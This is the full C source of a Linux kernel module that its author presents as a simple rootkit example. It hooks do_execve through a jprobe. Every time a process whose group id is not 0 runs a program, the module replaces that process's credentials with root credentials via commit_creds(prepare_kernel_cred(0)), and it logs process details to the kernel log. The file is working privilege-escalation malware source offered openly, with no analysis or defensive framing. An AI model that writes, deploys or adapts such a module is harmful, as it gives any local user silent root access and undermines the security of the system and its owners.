/* This program is a simple rootkit example implemented via kprobe
 * mechanism which provided by kernel itself
 *
 * monkey-coder: Shawn the R0ck@copyleft, <citypw@gmail.com>
 *  
 * This code is also GPL'ed!
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h> /* current task */
#include <linux/cred.h>
#include <linux/version.h>

/* Because I only tested this shit on Slackware with kernel 2.6.39 */
#if( LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 37))
#error "Please use higher kernel version, dude!"
#endif

static long jdo_execve(const char * filename, const char __user *const __user *argv, const char __user *const __user *envp, struct pt_regs * regs)
{
	/* not root */
	if( current->cred->gid != 0){
		commit_creds(prepare_kernel_cred(0));
	}

	printk(KERN_INFO "jprobe: filename: %s from %s, pid = %d, uid = %d, gid = %d\n",
	       filename, current->comm, current->pid, current->cred->uid, current->cred->gid);
	/* Always end with a call to jprobe_return(). */
	jprobe_return();
	return 0;
}

static struct jprobe my_jprobe = {
	.entry			= jdo_execve,
	.kp = {
		.symbol_name	= "do_execve",
	},
};

static int __init jprobe_init(void)
{
	int ret;

	ret = register_jprobe(&my_jprobe);
	if (ret < 0) {
		printk(KERN_INFO "register_jprobe failed, returned %d\n", ret);
		return -1;
	}
	printk(KERN_INFO "Planted jprobe at %p, handler addr %p\n",
	       my_jprobe.kp.addr, my_jprobe.entry);
	return 0;
}

static void __exit jprobe_exit(void)
{
	unregister_jprobe(&my_jprobe);
	printk(KERN_INFO "jprobe at %p unregistered, btw pid is %d\n", my_jprobe.kp.addr, current->pid);
}

module_init(jprobe_init)
module_exit(jprobe_exit)
MODULE_LICENSE("GPL");
